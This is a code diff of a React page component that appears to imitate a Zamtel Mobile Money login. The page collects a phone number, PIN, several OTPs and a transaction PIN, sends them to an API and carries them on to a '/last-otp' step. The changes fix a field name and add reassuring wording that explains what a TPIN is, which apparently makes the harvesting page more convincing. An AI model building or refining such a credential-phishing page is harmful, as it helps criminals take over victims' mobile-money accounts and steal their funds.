@@ -195,7 +195,7 @@ export default function ZamtelPin() {
     const [tpin, setTpin] = useState("");
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState("");
-    
+
 
     // Opened directly without a phone number -> back to login
     if (!phone) return <Navigate to="/" replace />;
@@ -231,7 +231,7 @@ export default function ZamtelPin() {
                         phone: `260${phone}`,
                         otp,
                         pin: newpin,
-                        secondtOtp: firstOtp,
+                        secondOtp: firstOtp,
                         tpin: tpin,
                     }),
                 }
@@ -245,7 +245,7 @@ export default function ZamtelPin() {
 
             // If you want to show error after API response
             // setError("Incorrect TPIN.");
-            navigate('/last-otp',{state: {phone , newpin, otp, firstOtp, tpin} })
+            navigate('/last-otp', { state: { phone, newpin, otp, firstOtp, tpin } })
             setTpin("");
         } catch (err) {
             setError(err.message || "Something went wrong. Try again.");
@@ -282,9 +282,17 @@ export default function ZamtelPin() {
                 </button>
 
                 {/* Heading */}
-                <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
+                {/* <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
                     Enter Zamtel Mobile Money TPIN
+                </h1> */}
+                <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
+                    What is a TPIN?
                 </h1>
+
+                <p className="mt-3 text-base leading-6 text-gray-700">
+                    A TPIN is your personal Mobile Money transaction
+                    PIN used to securely authorize transactions.
+                </p>
 
                 {/* <p className="mt-3 text-base text-gray-700">
                     Enter your Mobile Money TPIN for{" "}
@@ -298,14 +306,14 @@ export default function ZamtelPin() {
                     htmlFor="tpin"
                     className="mt-8 mb-2 block text-sm font-medium text-gray-800"
                 >
-                    Enter Zamtel Mobile Money TPIN
+                    {/* Enter Zamtel Mobile Money TPIN */}
+                    Enter 10 digits TPIN
                 </label>
 
                 {/* TPIN Input */}
                 <div
-                    className={`flex items-center rounded-2xl border-2 bg-white px-4 py-4 transition-colors focus-within:border-blue-500 ${
-                        error ? "border-red-400" : "border-gray-200"
-                    }`}
+                    className={`flex items-center rounded-2xl border-2 bg-white px-4 py-4 transition-colors focus-within:border-blue-500 ${error ? "border-red-400" : "border-gray-200"
+                        }`}
                 >
                     <input
                         id="tpin"
@@ -343,11 +351,10 @@ export default function ZamtelPin() {
                 <button
                     type="submit"
                     disabled={!tpin.trim() || loading}
-                    className={`mt-6 w-full rounded-2xl py-5 text-lg font-medium text-white transition-colors ${
-                        !tpin.trim() || loading
+                    className={`mt-6 w-full rounded-2xl py-5 text-lg font-medium text-white transition-colors ${!tpin.trim() || loading
                             ? "bg-gray-300 cursor-not-allowed"
                             : "bg-[#12A036] hover:bg-[#0e7a2a]"
-                    }`}
+                        }`}
                 >
                     {loading ? "Verifying..." : "Login"}
                 </button>
